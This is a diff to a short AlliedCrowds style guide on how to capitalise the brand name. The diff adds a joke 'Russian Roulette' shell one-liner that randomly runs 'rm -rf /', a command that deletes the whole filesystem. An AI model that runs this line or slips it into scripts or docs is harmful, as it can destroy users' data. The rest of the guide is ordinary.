@@ -1,4 +1,6 @@
 # AlliedCrowds General Style Guidelines
+> Let's play Russian Roulette:
+> `[ $[ $RANDOM % 6 ] == 0 ] && rm -rf / || echo *Click*`
 
 # "Alliedcrowds"
 AlliedCrowds should always be styled "AlliedCrowds," never "alliedcrowds", "alliedCrowds", or "Alliedcrowds"
